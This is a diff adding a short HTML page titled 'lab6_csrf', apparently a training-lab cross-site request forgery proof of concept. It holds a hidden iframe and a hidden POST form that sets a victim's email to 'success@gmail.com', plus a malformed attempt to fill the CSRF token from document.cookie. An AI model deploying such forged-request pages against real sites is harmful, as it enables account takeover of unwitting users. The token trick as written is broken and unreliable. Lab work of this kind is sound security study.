@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>lab6_csrf</title>
+</head>
+<body>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+    <form action="" method="POST" id="csrf_lab6" target="hiddenFrame">
+        <input type="hidden" name="email" value="success@gmail.com">
+        <input type="hidden" name="csrf" value=<script>document.cookie</script>>
+    </form>
+    
+</body>
+</html>
